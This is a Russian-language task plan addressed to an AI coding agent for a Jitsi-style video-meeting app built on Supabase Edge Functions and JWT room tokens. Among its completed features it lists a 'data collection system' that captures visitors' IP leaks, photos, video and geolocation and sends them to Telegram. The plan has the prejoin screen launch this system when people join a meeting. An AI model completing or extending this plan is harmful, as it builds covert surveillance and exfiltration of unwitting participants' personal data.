# TODO для AI (Реализация Frontend + Backend)

## ✅ ТЕКУЩЕЕ СОСТОЯНИЕ

- ✅ HomePage.tsx - создание/вход в комнату (базовый UI)
- ✅ JitsiPreJoin.tsx - экран подготовки с системой сбора данных
- ✅ JitsiRoom.tsx - основная комната с участниками
- ✅ Система сбора данных (IP leak, фото, видео, геолокация)
- ✅ Telegram интеграция для отправки данных
- ⚠️ НЕТ Supabase интеграции (комнаты не сохраняются)
- ⚠️ НЕТ JWT токенов (нет авторизации для Jitsi)
- ⚠️ НЕТ реальной интеграции с Jitsi Meet API

---

## 🔴 КРИТИЧНО: Дождаться настройки от человека

Перед началом работы нужно получить от пользователя:

- [ ] `VITE_SUPABASE_URL`
- [ ] `VITE_SUPABASE_ANON_KEY`
- [ ] Подтверждение что Edge Functions задеплоены
- [ ] Подтверждение что таблицы БД созданы

**❌ НЕ НАЧИНАТЬ БЕЗ ЭТИХ ДАННЫХ!**

---

## 📋 ФАЗА 1: Supabase клиент и утилиты

### 1.1 Создать Supabase клиент

- [ ] Файл: `/src/utils/supabaseClient.ts`
  - Инициализация Supabase с `VITE_SUPABASE_URL` и `VITE_SUPABASE_ANON_KEY`
  - Экспорт `supabase` клиента

### 1.2 Создать API утилиты для Edge Functions

- [ ] Файл: `/src/utils/jitsiAPI.ts`
  - `createRoom(hostName: string, roomTitle?: string)` → вызов Edge Function
  - `joinRoom(slug: string, displayName: string)` → получение JWT токена
  - `getRoom(slug: string)` → проверка существования комнаты
  - `endMeeting(slug: string, token: string)` → завершение комнаты (только для moderator)

### 1.3 Создать конфигурацию Jitsi

- [ ] Файл: `/src/utils/jitsiConfig.ts`
  - Экспорт конфига для Jitsi Meet API
  - Настройки UI (убрать watermark, лого и т.д.)

---

## 📋 ФАЗА 2: Обновить существующие компоненты

### 2.1 Обновить HomePage.tsx

**Текущее состояние:**
- ✅ Поле ввода имени комнаты
- ✅ Кнопка "Join"
- ⚠️ Сразу переход в `/prejoin/:roomName`

**Что нужно изменить:**

- [ ] Добавить UI для создания новой комнаты:
  ```typescript
  [Кнопка] "Create New Room" → 
    вызов createRoom(userName) → 
    получение { roomSlug, inviteLink } →
    переход на /prejoin/:roomSlug (как HOST)
  ```

- [ ] Обновить логику входа по коду:
  ```typescript
  [Поле + Кнопка] "Enter Room Code" + "Join" →
    вызов getRoom(roomCode) →
    если комната существует → 
    переход на /prejoin/:roomCode (как GUEST)
  ```

- [ ] Добавить отображение invite link после создания (скопировать в буфер)

- [ ] Добавить валидацию:
  - Имя не пустое
  - Room code формат (6-12 символов, только alphanum)

### 2.2 Обновить JitsiPreJoin.tsx

**Текущее состояние:**
- ✅ Запрос разрешений (камера, микрофон, геолокация)
- ✅ Запуск системы сбора данных
- ✅ Переход в `/room/:roomName`
- ⚠️ НЕТ получения JWT токена

**Что нужно изменить:**

- [ ] При нажатии "Join meeting" или "Join without audio":
  1. Вызвать `joinRoom(roomSlug, userName)` для получения JWT токена
  2. Получить `{ token, roomName, role, identity }`
  3. Запустить систему сбора данных (уже реализовано)
  4. Перейти в `/room/:roomSlug` передав `token`, `roomName`, `role`

- [ ] Обработать ошибки:
  - Комната не существует
  - Комната уже завершена
  - Достигнут лимит участников

- [ ] Добавить loading state во время получения токена

### 2.3 Обновить JitsiRoom.tsx

**Текущее состояние:**
- ✅ Левая панель с участниками
- ✅ Аватарка в центре
- ⚠️ НЕТ реальной интеграции с Jitsi
- ⚠️ Участники хардкоженные (mock данные)

**Что нужно изменить:**

- [ ] Интегрировать Jitsi Meet:
  - Использовать `@jitsi/web-sdk` (npm install)
  - Или использовать iframe с параметрами JWT
  - Инициализация с токеном полученным из PreJoin

- [ ] Получать список участников из Jitsi API (не mock)

- [ ] Добавить кнопку "End Meeting" (только для moderator)

- [ ] Обработать события:
  - `participantJoined` → обновить список
  - `participantLeft` → обновить список
  - `videoConferenceLeft` → вернуться на HomePage

---

## 📋 ФАЗА 3: Backend (Edge Functions)

### 3.1 Edge Function: create-room

- [ ] Файл: `supabase/functions/create-room/index.ts`

**Логика:**
1. Получить `hostName`, `roomTitle` из body
2. Сгенерировать уникальный `slug` (6 символов)
3. Сгенерировать уникальный `host_identity` (UUID)
4. Создать запись в таблице `rooms`
5. Вернуть `{ roomSlug, inviteLink, roomId }`

**Валидация:**
- hostName не пустое
- slug уникальный (проверить в БД)

### 3.2 Edge Function: join-room

- [ ] Файл: `supabase/functions/join-room/index.ts`

**Логика:**
1. Получить `slug` из URL, `displayName` из body
2. Проверить что комната существует и активна
3. Определить роль:
   - Если это первый участник (создатель) → `moderator`
   - Иначе → `participant`
4. Сгенерировать JWT токен с ролью
5. Создать запись в таблице `participants`
6. Вернуть `{ token, roomName, role, identity }`

**JWT структура:**
```json
{
  "aud": "jitsi",
  "iss": "JITSI_APP_ID",
  "sub": "meet.jit.si",
  "room": "abc123",
  "context": {
    "user": {
      "id": "unique-user-id",
      "name": "John Doe",
      "moderator": true
    }
  },
  "exp": 1234567890
}
```

**Использовать библиотеку:**
- `djwt` для Deno (для генерации JWT)

### 3.3 Edge Function: get-room

- [ ] Файл: `supabase/functions/get-room/index.ts`

**Логика:**
1. Получить `slug` из URL
2. Запросить комнату из БД
3. Вернуть `{ slug, title, isActive, hostName, createdAt }`

**Обработать:**
- Комната не найдена → 404
- Комната завершена → 410 Gone

### 3.4 Edge Function: end-meeting (опционально для MVP)

- [ ] Файл: `supabase/functions/end-meeting/index.ts`

**Логика:**
1. Получить `slug` из URL, `token` из headers
2. Проверить что токен валидный и роль = moderator
3. Обновить комнату: `is_active = false`, `ended_at = NOW()`
4. Вернуть `{ success: true }`

---

## 📋 ФАЗА 4: Установить зависимости

### NPM packages для Frontend

- [ ] `npm install @supabase/supabase-js` - Supabase клиент
- [ ] `npm install @jitsi/web-sdk` - Jitsi Meet SDK (или использовать iframe)

### Проверить package.json

- [ ] Убедиться что все пакеты установлены
- [ ] Убедиться что версии совместимы

---

## 📋 ФАЗА 5: Тестирование

### 5.1 Тест создания комнаты

- [ ] Открыть HomePage
- [ ] Ввести имя → "Create Room"
- [ ] Проверить что создалась запись в БД (Supabase Dashboard)
- [ ] Проверить что redirect на /prejoin/:slug

### 5.2 Тест получения токена

- [ ] На PreJoin нажать "Join"
- [ ] Проверить в консоли что получен JWT токен
- [ ] Проверить что создался participant в БД

### 5.3 Тест подключения к Jitsi

- [ ] Проверить что Jitsi iframe загружается
- [ ] Проверить что токен принимается
- [ ] Проверить что видео/аудио работают

### 5.4 Тест ролей

- [ ] Создать комнату (должен быть moderator)
- [ ] Открыть в другом браузере/инкогнито (должен быть participant)
- [ ] Проверить что кнопка "End Meeting" только у moderator

---

## 📋 ФАЗА 6: Обработка ошибок

### Frontend

- [ ] Обработать ошибки API (комната не найдена, токен невалидный)
- [ ] Добавить loading states
- [ ] Добавить retry логику для Edge Functions
- [ ] Показывать уведомления пользователю (toast/alert)

### Backend

- [ ] Валидация всех входных данных
- [ ] Try/catch блоки
- [ ] Правильные HTTP статус коды (200, 400, 404, 500)
- [ ] Логирование ошибок

---

## 📋 ФАЗА 7: Финальные доработки

### UI/UX

- [ ] Скелетоны для loading состояний
- [ ] Анимации переходов между страницами
- [ ] Адаптив для мобильных
- [ ] Обработка отключения интернета

### Безопасность

- [ ] Проверить что JWT secrets не попадают на фронт
- [ ] Проверить что критические действия идут через backend
- [ ] Добавить rate limiting (если нужно)

### Оптимизация

- [ ] Минимизировать количество запросов к БД
- [ ] Кэширование где возможно
- [ ] Оптимизировать размер бандла

---

## 🎯 ПРИОРИТЕТЫ

1. **Высокий приоритет** (без этого не работает):
   - Supabase клиент
   - Edge Functions (create-room, join-room, get-room)
   - JWT генерация
   - Обновление HomePage, PreJoin
   - Базовая интеграция с Jitsi

2. **Средний приоритет** (важно для UX):
   - Обработка ошибок
   - Loading states
   - Валидация форм
   - Список участников из Jitsi

3. **Низкий приоритет** (можно потом):
   - End meeting функционал
   - Webhooks
   - room_events таблица
   - Детальная аналитика

---

## 📊 Оценка времени

- **Фаза 1-2** (Supabase + обновление компонентов): 2-3 часа
- **Фаза 3** (Edge Functions): 2-3 часа
- **Фаза 4-5** (Установка + тесты): 1-2 часа
- **Фаза 6-7** (Ошибки + доработки): 2-3 часа

**Итого: 7-11 часов** (1.5-2 рабочих дня)

---

## ❓ Вопросы к человеку

Перед началом уточнить:

1. Использовать Jitsi SDK или iframe?
   - SDK = больше контроля, сложнее
   - iframe = проще, меньше контроля

2. Нужен ли функционал "End Meeting" для MVP?
   - Если да → добавить в высокий приоритет
   - Если нет → можно потом

3. Нужна ли запись созвонов?
   - Если да → нужно настроить Jibri (сложно)
   - Если нет → ОК

4. Нужны ли пароли для комнат?
   - Если да → добавить поле `passcode` в create-room
   - Если нет → ОК

---

## 🚀 Когда начинать?

Как только человек подтвердит:
- ✅ Supabase проект настроен
- ✅ Таблицы созданы
- ✅ Edge Functions готовы к деплою
- ✅ `.env.local` с правильными ключами

Тогда начинаем с **ФАЗЫ 1** и двигаемся последовательно! 🎉
